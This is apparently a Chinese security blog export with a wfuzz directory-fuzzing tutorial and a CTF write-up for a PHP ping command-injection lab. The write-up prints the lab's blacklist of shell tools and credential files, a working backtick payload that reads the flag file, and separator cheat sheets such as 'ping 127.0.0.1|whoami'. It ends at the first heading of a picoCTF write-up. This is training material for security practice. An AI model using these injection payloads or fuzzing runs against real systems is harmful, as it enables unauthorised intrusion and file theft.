<p>安装pycurl依赖库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libcurl4-openssl-dev</span><br><span class="line">apt-get install libcurl4-gnutls-dev</span><br><span class="line">apt-get install libghc-gnutls-dev</span><br></pre></td></tr></table></figure></p>
<p>再通过pip进行安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycurl</span><br><span class="line">pip install wfuzz</span><br></pre></td></tr></table></figure></p>
<h2 id="初识wfuzz"><a href="#初识wfuzz" class="headerlink" title="初识wfuzz"></a>初识wfuzz</h2><h3 id="最简单的一个命令"><a href="#最简单的一个命令" class="headerlink" title="最简单的一个命令"></a>最简单的一个命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ  <span class="comment"># win10</span></span><br><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ  <span class="comment"># ubuntu18.04</span></span><br></pre></td></tr></table></figure>
<p>(可能是我下了github的wfuzz的原因,我的字典不在/usr/share里,而在wfuzz包里)</p>
<p>输出参数对应信息:</p>
<p>ID：测试时的请求序号<br>Response：HTTP响应吗<br>Lines：响应信息中的行数<br>Word：响应信息中的字数<br>Chars：响应信息中的字符数<br>Payload：当前使用的payload</p>
<h3 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h3><p>wfuzz可用的模块有payloads,encoders,iterators,printers和scripts<br>使用时可以通过以下命令查看其中可用的模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -e iterators</span><br><span class="line">wfuzz -z <span class="built_in">help</span></span><br><span class="line">wfuzz -z <span class="built_in">help</span> --slice <span class="string">"dirwalk"</span>  <span class="comment"># 对输出结果过滤查看</span></span><br></pre></td></tr></table></figure></p>
<h3 id="指定一个payload"><a href="#指定一个payload" class="headerlink" title="指定一个payload"></a>指定一个payload</h3><p>每个FUZZ占位符都必须为它指定相应的payload,以下是使用方法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令比较长的方式是显式的定义payload的参数:</span></span><br><span class="line">wfuzz -z file --zP fn=/usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br><span class="line"><span class="comment"># 另一个不太长的方式是只提供payload所需的默认参数：</span></span><br><span class="line">wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br><span class="line"><span class="comment"># 最后，短的方式是使用别名：</span></span><br><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
<p>stdin这个payload可以在使用一些外部字典生成工具时很方便：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install crunch</span><br><span class="line">crunch 2 2 ab | wfuzz -z stdin http://testphp.vulnweb.com/FUZZ</span><br></pre></td></tr></table></figure></p>
<h3 id="使用多个payloads"><a href="#使用多个payloads" class="headerlink" title="使用多个payloads"></a>使用多个payloads</h3><p>使用-z 或-w 参数可以同时指定多个payloads，这时相应的占位符应设置为 FUZZ, … , FUZnZ, 其中n代表了payload的序号。比如下面的例子，我们同时暴破文件，后缀和目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w ./wordlist/general/common.txt -w ./wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt --hc 404 http://testphp.vulnweb.com/FUZZ/FUZ2ZFUZ3Z</span><br></pre></td></tr></table></figure></p>
<h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>通过–hc，–hl，–hw，–hh参数可以隐藏某些HTTP响应<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--hc 404  <span class="comment"># 隐藏无法找到的页面</span></span><br><span class="line">--hc 404,403  <span class="comment"># 隐藏多个禁止访问的响应</span></span><br></pre></td></tr></table></figure></p>
<p>用行数，字数，字符数来指定过滤规则，在当HTTP返回码相同的时候比较方便<br>比如，网站一般会指定一个自定义的错误页面，返回码是200，但实际上起到了一个404页面的作用，我们称之为软404<br>这时候就需要添加别的参数来过滤<br>显示响应结果也有对应的参数<br>–sc，–sl，–sw，–sh</p>
<h2 id="payload各模块功能列举"><a href="#payload各模块功能列举" class="headerlink" title="payload各模块功能列举"></a>payload各模块功能列举</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>payload为wfuzz生成的用于测试的特定字符串，一般情况下，会替代被测试URL中的FUZZ占位符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">guitab | 从可视化的标签栏中读取请求</span><br><span class="line">dirwalk | 递归获得本地某个文件夹中的文件名</span><br><span class="line">file | 获取一个文件当中的每个词</span><br><span class="line">autorize | 获取autorize的测试结果Returns fuzz results&apos; from autororize.</span><br><span class="line">wfuzzp | 从之前保存的wfuzz会话中获取测试结果的URL</span><br><span class="line">ipnet | 获得一个指定网络的IP地址列表</span><br><span class="line">bing | 获得一个使用bing API搜索的URL列表 (需要 api key).</span><br><span class="line">stdin | 获得从标准输入中的条目</span><br><span class="line">list | 获得一个列表中的每一个元素，列表用以 - 符号分格</span><br><span class="line">hexrand | 从一个指定的范围中随机获取一个hex值</span><br><span class="line">range | 获得指定范围内的每一个数值</span><br><span class="line">names | 从一个以 - 分隔的列表中，获取以组合方式生成的所有usernames值</span><br><span class="line">burplog | 从BurpSuite的记录中获得测试结果</span><br><span class="line">permutation | 获得一个在指定charset和length时的字符组合</span><br><span class="line">buffer_overflow | 获得一个包含指定个数个A的字符串.</span><br><span class="line">hexrange | 获得指定范围内的每一个hex值</span><br><span class="line">iprange | 获得指定IP范围内的IP地址列表</span><br><span class="line">burpstate | 从BurpSuite的状态下获得测试结果</span><br></pre></td></tr></table></figure>
<h3 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h3><p>encoder的作用是将payload进行编码或加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">url_safe, url | urlencode | 用`%xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">url_safe, url | double urlencode | 用`%25xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">url | uri_double_hex | 用`%25xx`的方式将所有字符进行编码</span><br><span class="line">html | html_escape | 将`&amp;`，`&lt;`，`&gt;`转换为HTML安全的字符</span><br><span class="line">html | html_hexadecimal | 用 `&amp;#xx;` 的方式替换所有字符</span><br><span class="line">hashes | base64 | 将给定的字符串中的所有字符进行base64编码</span><br><span class="line">url | doble_nibble_hex | 将所有字符以`%%dd%dd`格式进行编码</span><br><span class="line">db | mssql_char | 将所有字符转换为MsSQL语法的`char(xx)`形式</span><br><span class="line">url | utf8 | 将所有字符以`\u00xx` 格式进行编码</span><br><span class="line">hashes | md5 | 将给定的字符串进行md5加密</span><br><span class="line">default | random_upper | 将字符串中随机字符变为大写</span><br><span class="line">url | first_nibble_hex | 将所有字符以`%%dd?` 格式进行编码</span><br><span class="line">default | hexlify | 每个数据的单个比特转换为两个比特表示的hex表示</span><br><span class="line">url | second_nibble_hex | 将所有字符以`%?%dd` 格式进行编码</span><br><span class="line">url | uri_hex | 将所有字符以`%xx` 格式进行编码</span><br><span class="line">default | none | 不进行任何编码</span><br><span class="line">hashes | sha1 | 将字符串进行sha1加密</span><br><span class="line">url | utf8_binary | 将字符串中的所有字符以 `\uxx` 形式进行编码</span><br><span class="line">url | uri_triple_hex | 将所有字符以`%25%xx%xx` 格式进行编码</span><br><span class="line">url | uri_unicode | 将所有字符以`%u00xx` 格式进行编码</span><br><span class="line">html | html_decimal | 将所有字符以 `&amp;#dd; ` 格式进行编码</span><br><span class="line">db | oracle_char | 将所有字符转换为Oracle语法的`chr(xx)`形式</span><br><span class="line">db | mysql_char | 将所有字符转换为MySQL语法的`char(xx)`形式</span><br></pre></td></tr></table></figure>
<h3 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h3><p>wfuzz的iterator提供了针对多个payload的处理方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">product | 返回输入条目的笛卡尔积</span><br><span class="line">zip | Retns an iterator that aggregates elements from each of the iterables.（翻译不好，请自行理解）</span><br><span class="line">chain | Returns an iterator returns elements from the first iterable until it is exhaust</span><br><span class="line">| ed, then proceeds to the next iterable, until all of the iterables are exhausted</span><br></pre></td></tr></table></figure>
<h3 id="printer"><a href="#printer" class="headerlink" title="printer"></a>printer</h3><p>wfuzz的printers用于控制输出打印</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">raw | `Raw` output format</span><br><span class="line">json | Results in `json` format</span><br><span class="line">csv | `CSV` printer ftw</span><br><span class="line">magictree | Prints results in `magictree` format</span><br><span class="line">html | Prints results in `html` format</span><br></pre></td></tr></table></figure>
<h3 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">default, passive | cookies | 查找新的cookies</span><br><span class="line">default, passive | errors | 查找错误信息</span><br><span class="line">passive | grep | HTTP response grep</span><br><span class="line">active | screenshot | 用linux cutycapt tool 进行屏幕抓取</span><br><span class="line">default, active, discovery | links | 解析HTML并查找新的内容</span><br><span class="line">default, active, discovery | wc_extractor | 解析subversion的wc.db文件</span><br><span class="line">default, passive | listing | 查找列目录漏洞</span><br><span class="line">default, passive | title | 解析HTML页面的title</span><br><span class="line">default, active, discovery | robots | 解析robots.txt文件来查找新内容</span><br><span class="line">default, passive | headers | 查找服务器的返回头</span><br><span class="line">default, active, discovery | cvs_extractor | 解析 CVS/Entries 文件</span><br><span class="line">default, active, discovery | svn_extractor | 解析 .svn/entries 文件</span><br><span class="line">active, discovery | backups | 查找已知的备份文件名</span><br><span class="line">default, active, discovery | sitemap | 解析 sitemap.xml 文件</span><br></pre></td></tr></table></figure>
<h2 id="内置工具"><a href="#内置工具" class="headerlink" title="内置工具"></a>内置工具</h2><h3 id="wfencode工具"><a href="#wfencode工具" class="headerlink" title="wfencode工具"></a>wfencode工具</h3><p>是wfuzz自带的一个加密/解密（编码/反编码）工具，目前支持内建的encoders的加/解密</p>
<p>使用:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfencode -e base64 123456</span><br><span class="line">wfencode -d base64 MTIzNDU2</span><br></pre></td></tr></table></figure></p>
<h3 id="wfpayload工具"><a href="#wfpayload工具" class="headerlink" title="wfpayload工具"></a>wfpayload工具</h3><p>wfpayload是payload生成工具</p>
<p>使用:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfpayload -z range,0-10</span><br></pre></td></tr></table></figure></p>
<h2 id="wfuzz命令中文帮助"><a href="#wfuzz命令中文帮助" class="headerlink" title="wfuzz命令中文帮助"></a>wfuzz命令中文帮助</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Usage: wfuzz [options] -z payload,params &lt;url&gt;</span><br><span class="line">FUZZ, ..., FUZnZ payload占位符，wfuzz会用指定的payload代替相应的占位符，n代表数字.</span><br><span class="line">FUZZ&#123;baseline_value&#125; FUZZ 会被 baseline_value替换，并将此作为测试过程中第一个请求来测试，可用来作为过滤的一个基础。</span><br><span class="line">Options:</span><br><span class="line">-h/--help : 帮助文档</span><br><span class="line">--help : 高级帮助文档</span><br><span class="line">--version : Wfuzz详细版本信息</span><br><span class="line">-e &lt;type&gt; : 显示可用的encoders/payloads/iterators/printers/scripts列表</span><br><span class="line">--recipe &lt;filename&gt; : 从文件中读取参数</span><br><span class="line">--dump-recipe &lt;filename&gt; : 打印当前的参数并保存成文档</span><br><span class="line">--oF &lt;filename&gt; : 将测试结果保存到文件，这些结果可被wfuzz payload 处理</span><br><span class="line">-c : 彩色化输出</span><br><span class="line">-v : 详细输出</span><br><span class="line">-f filename,printer : 将结果以printer的方式保存到filename (默认为raw printer).</span><br><span class="line">-o printer : 输出特定printer的输出结果</span><br><span class="line">--interact : (测试功能) 如果启用，所有的按键将会被捕获，这使得你能够与程序交互</span><br><span class="line">--dry-run : 打印测试结果，而并不发送HTTP请求</span><br><span class="line">--prev : 打印之前的HTTP请求（仅当使用payloads来生成测试结果时使用）</span><br><span class="line">-p addr : 使用代理，格式 ip:port:type. 可设置多个代理，type可取的值为SOCKS4,SOCKS5 or HTTP（默认）</span><br><span class="line">-t N : 指定连接的并发数，默认为10</span><br><span class="line">-s N : 指定请求的间隔时间，默认为0</span><br><span class="line">-R depth : 递归路径探测，depth指定最大递归数量</span><br><span class="line">-L,--follow : 跟随HTTP重定向</span><br><span class="line">-Z : 扫描模式 (连接错误将被忽视).</span><br><span class="line">--req-delay N : 设置发送请求允许的最大时间，默认为 90，单位为秒.</span><br><span class="line">--conn-delay N : 设置连接等待的最大时间，默认为 90，单位为秒.</span><br><span class="line">-A : 是 --script=default -v -c 的简写</span><br><span class="line">--script= : 与 --script=default 等价</span><br><span class="line">--script=&lt;plugins&gt; : 进行脚本扫描， &lt;plugins&gt; 是一个以逗号分开的插件或插件分类列表</span><br><span class="line">--script-help=&lt;plugins&gt; : 显示脚本的帮助</span><br><span class="line">--script-args n1=v1,... : 给脚本传递参数. ie. --script-args grep.regex=&quot;&lt;A href=\&quot;(.*?)\&quot;&gt;&quot;</span><br><span class="line">-u url : 指定请求的URL</span><br><span class="line">-m iterator : 指定一个处理payloads的迭代器 (默认为product)</span><br><span class="line">-z payload : 为每一个占位符指定一个payload，格式为 name[,parameter][,encoder].</span><br><span class="line">编码可以是一个列表, 如 md5-sha1. 还可以串联起来, 如. md5@sha1.</span><br><span class="line">还可使用编码各类名，如 url</span><br><span class="line">使用help作为payload来显示payload的详细帮助信息，还可使用--slice进行过滤</span><br><span class="line">--zP &lt;params&gt; : 给指定的payload设置参数。必须跟在 -z 或-w 参数后面</span><br><span class="line">--slice &lt;filter&gt; : 以指定的表达式过滤payload的信息，必须跟在-z 参数后面</span><br><span class="line">-w wordlist : 指定一个wordlist文件，等同于 -z file,wordlist</span><br><span class="line">-V alltype : 暴力测试所有GET/POST参数，无需指定占位符</span><br><span class="line">-X method : 指定一个发送请求的HTTP方法，如HEAD或FUZZ</span><br><span class="line">-b cookie : 指定请求的cookie参数，可指定多个cookie</span><br><span class="line">-d postdata : 设置用于测试的POST data (ex: &quot;id=FUZZ&amp;catalogue=1&quot;)</span><br><span class="line">-H header : 设置用于测试请求的HEADER (ex:&quot;Cookie:id=1312321&amp;user=FUZZ&quot;). 可指定多个HEADER.</span><br><span class="line">--basic/ntlm/digest auth : 格式为 &quot;user:pass&quot; or &quot;FUZZ:FUZZ&quot; or &quot;domain\FUZ2Z:FUZZ&quot;</span><br><span class="line">--hc/hl/hw/hh N[,N]+ : 以指定的返回码/行数/字数/字符数作为判断条件隐藏返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">--sc/sl/sw/sh N[,N]+ : 以指定的返回码/行数/字数/字符数作为判断条件显示返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">--ss/hs regex : 显示或隐藏返回结果中符合指定正则表达式的返回结果</span><br><span class="line">--filter &lt;filter&gt; : 显示或隐藏符合指定filter表达式的返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">--prefilter &lt;filter&gt; : 用指定的filter表达式在测试之前过滤某些测试条目</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> wfuzz </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[20088靶场wp]]></title>
      <url>/ctf-writeup-web/ckwd5ws5l0005d0uc5xq7z7p3/</url>
      <content type="html"><![CDATA[<h2 id="20088靶场wp"><a href="#20088靶场wp" class="headerlink" title="20088靶场wp"></a>20088靶场wp</h2><p>链接: <a href="http://172.17.135.48:20088" target="_blank" rel="noopener">172.17.135.48:20088</a></p>
<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">"."</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">        IP: &lt;input type=<span class="string">"text"</span> name=<span class="string">"ip"</span>&gt; &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Ping"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;<span class="meta">&lt;?php</span></span><br><span class="line">        $blacklist = [</span><br><span class="line">            <span class="string">'flag'</span>, <span class="string">'cat'</span>, <span class="string">'nc'</span>, <span class="string">'sh'</span>, <span class="string">'cp'</span>, <span class="string">'touch'</span>, <span class="string">'mv'</span>, <span class="string">'rm'</span>, <span class="string">'ps'</span>, <span class="string">'top'</span>, <span class="string">'sleep'</span>, <span class="string">'sed'</span>,</span><br><span class="line">            <span class="string">'apt'</span>, <span class="string">'yum'</span>, <span class="string">'curl'</span>, <span class="string">'wget'</span>, <span class="string">'perl'</span>, <span class="string">'python'</span>, <span class="string">'zip'</span>, <span class="string">'tar'</span>, <span class="string">'php'</span>, <span class="string">'ruby'</span>, <span class="string">'kill'</span>,</span><br><span class="line">            <span class="string">'passwd'</span>, <span class="string">'shadow'</span>, <span class="string">'root'</span>,</span><br><span class="line">            <span class="string">'z'</span>,</span><br><span class="line">            <span class="string">'dir'</span>, <span class="string">'dd'</span>, <span class="string">'df'</span>, <span class="string">'du'</span>, <span class="string">'free'</span>, <span class="string">'tempfile'</span>, <span class="string">'touch'</span>, <span class="string">'tee'</span>, <span class="string">'sha'</span>, <span class="string">'x64'</span>, <span class="string">'g'</span>,</span><br><span class="line">            <span class="string">'xargs'</span>, <span class="string">'PATH'</span>,</span><br><span class="line">            <span class="string">'$0'</span>, <span class="string">'proc'</span>,</span><br><span class="line">            <span class="string">'/'</span>, <span class="string">'&amp;'</span>, <span class="string">'|'</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">';'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>, <span class="string">'\\'</span>, <span class="string">"\n"</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $blacklist;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(strlen($ip) &gt; <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'IP toooooo longgggggggggg'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $keyword) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">"&#123;$keyword&#125; not allowed"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(<span class="string">"ping -c 1 \"&#123;$ip&#125;\" 2&gt;&amp;1"</span>, $ret);</span><br><span class="line">                <span class="keyword">return</span> implode(<span class="string">"\n"</span>, array_slice($ret, <span class="number">0</span>, <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'ip'</span>]))</span><br><span class="line">            <span class="keyword">echo</span> htmlentities(ping($_GET[<span class="string">'ip'</span>]));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现是一道php的命令执行注入题,黑名单里过滤了很多命令,但是很多通配符没有过滤比如’$’,’`‘,’*‘等</p>
<p>‘`‘在php中也叫执行运算符，使用时等同于<code>shell_exec()</code>函数,命令执行时PHP将尝试将反引号中的内容作为 shell命令来执行，并将其输出信息返回</p>
<p>而exec()函数里的ping命令,表示只发一个request包且标准输出重定向到我们输入的命令,即在终端上执行我们输入的命令,形成注入漏洞,所以可以先尝试读取文件</p>
<figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>可以发现命令执行成功,这时候就可以从shell命令着手,尝试读取flag.php</p>
<p>在shell中,读取文件时的<code>*</code>表示任意数目的任意字符,在正则中表示重复前面的字符任意多次（包括0次）,两者在指明文件时的用法也不一样,正则里要用<code>^</code>表示匹配字符串开头,或用<code>+</code>表示匹配前面的字符1次或多次,在这道题里仅用<code>f*</code>即可指明为flag.php,其他题目读取时同理</p>
<p>由此可以构造payload: </p>
<p><a href="http://172.17.135.48:20088/?ip=`head%20f*`" target="_blank" rel="noopener">http://172.17.135.48:20088/?ip=<code>head%20f*</code></a></p>
<figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>得到flag:  flag{Y0u_s01ve_1t_!!1}</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>linux里用来读文件的命令很多,灵活使用可以绕过很多黑名单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat    由第一行开始显示文件内容</span><br><span class="line">tac    从最后一行开始显示，可以看出 tac 是 cat 的倒着写</span><br><span class="line">nl     显示的时候，顺道输出行号</span><br><span class="line">more   一页一页的显示文件内容</span><br><span class="line">less   与 more 类似，但是比 more 更好的是，可以往前翻页</span><br><span class="line">head   只看头几行</span><br><span class="line">tail   只看尾巴几行</span><br><span class="line">sort   可以在读取文件时进行排序输出</span><br></pre></td></tr></table></figure></p>
<p>此外还有关于使用管道符拼接执行命令的操作,顺便记录一下</p>
<ul>
<li>Windows管道符</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">“|”:直接执行后面的语句。如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:如果前面执行的语句出错泽执行后面的语句，前面的语句智能为假 如：ping 2 || whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 如 ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错,也不执行后面的语句，前面的语句只能为真。例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux管道符</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">“;”:执行完前面的语句再执行后面的 例如:ping 127.0.0.1;whoami</span><br><span class="line"></span><br><span class="line">“|”:显示后面语句的执行结果 例如:ping 127.0.0.1|whoami</span><br><span class="line"></span><br><span class="line">“||”:当前面的语句只能怪出错时，执行后面的语句，例如:ping 1||whoami</span><br><span class="line"></span><br><span class="line">“&amp;”:如果当前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如:ping 127.0.0.1&amp;whoami</span><br><span class="line"></span><br><span class="line">“&amp;&amp;”:如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真 例如:ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2019picoCTF部分wp(5000分记录)]]></title>
      <url>/ctf-writeup/ckwd5ws5o0006d0ucrmya7xnp/</url>
      <content type="html"><![CDATA[<h1 id="一般技能"><a href="#一般技能" class="headerlink" title="一般技能"></a>一般技能</h1><h2 id="The-Factory’s-Secret-Points-1"><a href="#The-Factory’s-Secret-Points-1" class="headerlink" title="The Factory’s Secret - Points: 1"></a>The Factory’s Secret - Points: 1</h2><blockquote>
